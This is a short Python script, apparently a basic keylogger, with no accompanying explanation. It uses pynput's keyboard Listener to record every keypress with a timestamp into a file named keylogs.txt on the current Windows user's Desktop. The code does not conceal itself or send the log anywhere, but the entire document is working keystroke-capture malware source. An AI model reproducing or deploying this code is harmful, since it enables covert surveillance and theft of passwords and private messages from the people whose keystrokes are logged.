from pynput.keyboard import Listener
import os
import logging

def logger(key):
    logging.info(key)

username = os.getlogin()

logging.basicConfig(filename=f"C:/Users/{username}/Desktop/keylogs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

with Listener(on_press=logger) as key_press:
    key_press.join()
